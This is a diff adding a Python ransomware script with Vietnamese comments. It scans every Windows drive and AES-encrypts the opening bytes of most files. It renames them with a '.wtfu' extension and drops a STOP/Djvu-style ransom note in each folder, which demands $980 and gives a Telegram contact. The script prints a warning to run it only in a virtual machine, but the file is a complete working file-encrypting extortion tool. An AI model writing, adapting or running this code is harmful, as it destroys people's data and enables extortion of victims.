@@ -1,0 +1,240 @@
+import os, shutil
+from pathlib import Path
+from Crypto.Cipher import AES, PKCS1_OAEP
+from Crypto.PublicKey import RSA
+from Crypto.Random import get_random_bytes
+
+# Danh sách extension KHÔNG được đụng tới (rất nên mở rộng thêm)
+SKIP_EXTENSIONS = {
+    '.exe', '.dll', '.sys', '.msi', '.lnk', '.ocx', '.scr', '.cpl', '.drv',
+    '.bat', '.cmd', '.ps1', '.vbs', '.js', '.hta', '.mui', '.cat', '.inf',
+    '.ini', '.manifest', 'NTUSER.DAT', '.boot.ini', 'bootfont.bin', 'ntldr',
+    '.autorun.inf', 'desktop.ini', '.iconcache.db', 'Thumbs.db', '.nomedia',
+    '.ttf', '.otf', '.fon', '.cur', '.ani', '.msstyles',
+    '.deskthemepack', '.themepack', '.tmp', '.temp', '.msc', '.rtp', '.msu',
+    '.idx', '.key', '.pub', '.cab', '.url', '.vsix', '.py', '.pyd', '.rdp',
+    '.386', '.wtfu',
+    # Thêm rất nhiều nữa nếu muốn an toàn hơn
+    '.log', '.evtx', '.etl', '.mum', '.manifest', '.sdb', '.pdb', '.ilk',
+    '.idb', '.exp', '.lib', '.obj', '.pch', '.res', '.rsp', '.tlb', '.tlh',
+    '.tli', '.trc', '.wpj', '.sln', '.suo', '.user', '.aps', '.ncb', '.opt',
+    '.plg', '.positions', '.sdf', '.opensdf', '.VC.db', '.VC.VC.opendb',
+    # Hệ thống Windows cực kỳ quan trọng
+    '.sys', '.mui', '.cat', '.dll', '.exe', '.scr', '.cpl', '.drv',
+    'pagefile.sys', 'hiberfil.sys', 'swapfile.sys'
+}
+
+
+RANSOM_NOTE = """
+ATTENTION!
+
+Don't worry, you can return all your files!
+All your files like pictures, databases, documents and other important are encrypted with strongest encryption and unique key.
+The only method of recovering files is to purchase decrypt tool and unique key for you.
+This software will decrypt all your encrypted files.
+
+What guarantees you have?
+You can send one of your encrypted file from your PC and we decrypt it for free.
+But we can decrypt only 1 file for free. File must not contain valuable information.
+You can get and look video overview decrypt tool:
+https://we.tl/t-hmnZYNZHN5
+Price of private key and decrypt software is $980.
+Discount 50% available if you contact us first 72 hours, that's price for you is $490.
+Please note that you'll never restore your data without payment.
+Check your e-mail "Spam" or "Junk" folder if you don't get answer more than 6 hours.
+
+Reserve e-mail address to contact us:
+t.me/LINHKEO86_0
+
+"""
+
+
+# ///////////////////////////////////////////////////////////////////////////
+# ///////////////////////////////////////////////////////////////////////////
+dropped_folders = set()
+def drop_ransom_note(folder_path: Path):
+    """Tạo file _readme.txt hoặc read_this.txt trong thư mục"""
+    note_path = folder_path / "_readme.log"  # tên phổ biến của STOP/Djvu
+    if not note_path.exists():
+        try:
+            with open(note_path, 'w', encoding='utf-8') as f:
+                f.write(RANSOM_NOTE)
+            print(f"[NOTE] Dropped ransom note in: {folder_path}")
+        except Exception as e:
+            print(f"[Error dropping note] {folder_path}: {e}")
+
+# ///////////////////////////////////////////////////////////////////////////
+# ///////////////////////////////////////////////////////////////////////////
+
+def should_skip(path: Path) -> bool:
+    """Kiểm tra xem file có nên bị bỏ qua không"""
+    name_lower = path.name.lower()
+    if name_lower in SKIP_EXTENSIONS:
+        return True
+    return path.suffix.lower() in SKIP_EXTENSIONS
+
+
+def get_all_drives():
+#     """Tự động tìm tất cả ổ đĩa có sẵn trên Windows"""
+    drives = [] # ABCDEFGHIJKLMNOPQRSTUVWXYZ
+    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
+        drive = f"{letter}:\\"
+        if os.path.exists(drive):
+            drives.append(drive)
+    return drives
+
+
+def encrypt_file_partial(filepath: Path, aes_key: bytes, iv: bytes, max_encrypt_kb: int = 153605):
+    if should_skip(filepath): # Bỏ qua file có đuôi ngoại lệ
+        print(f"[SKIP] {filepath}")
+        return False
+
+
+    try:
+        file_size = filepath.stat().st_size
+        # if file_size < 4096:  # File quá nhỏ, bỏ qua
+        #    return False
+
+
+
+        bytes_to_encrypt = min(file_size, max_encrypt_kb)
+
+        with open(filepath, 'rb') as f:
+            header = f.read(bytes_to_encrypt)
+            remaining = f.read() if bytes_to_encrypt < file_size else b''
+
+
+
+        # Padding đơn giản (PKCS7-like)
+        padding_len = AES.block_size - (len(header) % AES.block_size)
+        padded = header + bytes([padding_len]) * padding_len
+
+        # Mã hóa header bằng AES (dùng chung 1 key + 1 IV cho tất cả file)
+        cipher = AES.new(aes_key, AES.MODE_CBC, iv)
+        encrypted_header = cipher.encrypt(padded)
+
+
+
+        # Ghi đè file: [IV] [encrypted_header] [phần còn lại]
+        with open(filepath, 'wb') as f:
+            f.write(iv)                    # 16 bytes
+            f.write(encrypted_header)
+            f.write(remaining)
+
+        new_path = filepath.with_suffix(filepath.suffix + '.wtfu')
+        os.rename(str(filepath), str(filepath) + ".wtfu")
+        print(f"[ENCR] {bytes_to_encrypt:>9,} bytes - {filepath}")
+
+
+
+        # === DROP RANSOM NOTE - chỉ 1 lần mỗi thư mục ===
+        parent_folder = new_path.parent
+        folder_str = str(parent_folder.absolute())  # dùng str để lưu vào set
+        
+        if folder_str not in dropped_folders:
+            drop_ransom_note(parent_folder)
+            dropped_folders.add(folder_str)
+
+
+        return True
+
+    except Exception as e:
+        print(f"[Error] {filepath}: {e}")
+        return False
+
+
+
+
+
+
+
+
+
+
+
+
+
+# ///////////////////////////////////////////////////////////////////////////
+# ///////////////////////////////////////////////////////////////////////////
+def run():
+    print("!!! CẢNH BÁO NGHIÊM TRỌNG !!!")
+    print("Chương trình này sẽ mã hóa phần đầu của rất nhiều file trên máy.")
+    print("Chỉ chạy trong MÁY ẢO hoặc trên dữ liệu thử nghiệm!")
+    print("MẤT private key = MẤT VĨNH VIỄN toàn bộ dữ liệu đã mã hóa.")
+    input("\nNhấn Enter để tiếp tục (hoặc Ctrl+C để thoát ngay)...\n")
+
+    # ///////////////////////////////////////////////////////////////////////////
+    # ///////////////////////////////////////////////// Tạo cặp khóa RSA một lần
+    rsa_key = RSA.generate(2048)
+    public_key = rsa_key.publickey()
+    private_key = rsa_key.export_key()
+
+    # Lưu private key (bắt buộc giữ lại!)
+    print("Save: PRIVATE_KEY_DO_NOT_DELETE.key")
+    with open("PRIVATE_KEY_DO_NOT_DELETE.key", "wb") as f:
+        f.write(private_key)
+
+    # ///////////////////////////////////////////////////////////////////////////
+    # ///////////////////////////////////////////////// Tạo cặp khóa AES một lần
+    aes_key = get_random_bytes(32)  # AES-256
+    iv = get_random_bytes(16)       # Initialization Vector
+
+    # Mã hóa khóa AES bằng RSA public key và lưu
+    cipher_rsa = PKCS1_OAEP.new(public_key)
+    encrypted_aes_key = cipher_rsa.encrypt(aes_key)
+
+    print("Save AES: AES_KEY_DO_NOT_DELETE.key\n")
+    with open("AES_KEY_DO_NOT_DELETE.key", "wb") as f:
+        f.write(encrypted_aes_key)
+    # ///////////////////////////////////////////////////////////////////////////
+    # ///////////////////////////////////////////////////////////////////////////
+
+
+
+
+
+
+    # print("→ Sử dụng chung 1 khóa AES + 1 IV cho tất cả file\n")
+    dest = Path.home() / "AppData" / "Local"
+
+
+    dest_file = os.path.join(dest, "PRIVATE_KEY_DO_NOT_DELETE.key")
+    dest_file2 = os.path.join(dest, "AES_KEY_DO_NOT_DELETE.key")
+    # if os.path.exists(dest_file):
+    #     os.remove(dest_file)
+        
+    # if os.path.exists(dest_file2):
+    #     os.remove(dest_file2)
+
+    # Di chuyển (file gốc sẽ mất)
+    shutil.move("PRIVATE_KEY_DO_NOT_DELETE.key", dest)
+    shutil.move("AES_KEY_DO_NOT_DELETE.key", dest)
+
+    # ///////////////////////////////////////////////////////////////////////////
+    # /////////////////////////////////////////////// Scan ổ đĩa để mã hoá
+    drives = get_all_drives()
+    print(f"Found drive: {', '.join(drives)}\n")
+
+    total_processed = 0
+
+    for drive in drives:
+        print(f"\n=== Scan Drive {drive} ===")
+        try:
+            for root, dirs, files in os.walk(drive, topdown=False):
+                for file in files:
+                    path = Path(root) / file
+                    if encrypt_file_partial(path, aes_key, iv, max_encrypt_kb=153605):
+                        total_processed += 1
+                        if total_processed % 100 == 0:
+                            print(f"   → Đã xử lý {total_processed:,} file...")
+        except Exception as e:
+            print(f"[LỖI Ổ {drive}]: {e}")
+    # ///////////////////////////////////////////////////////////////////////////
+
+
+    print("\n" + "="*60)
+    print(f"HOÀN TẤT!")
+    print(f"Tổng cộng đã mã hóa header của {total_processed:,} file.")
+    print("="*60)
+
+run()
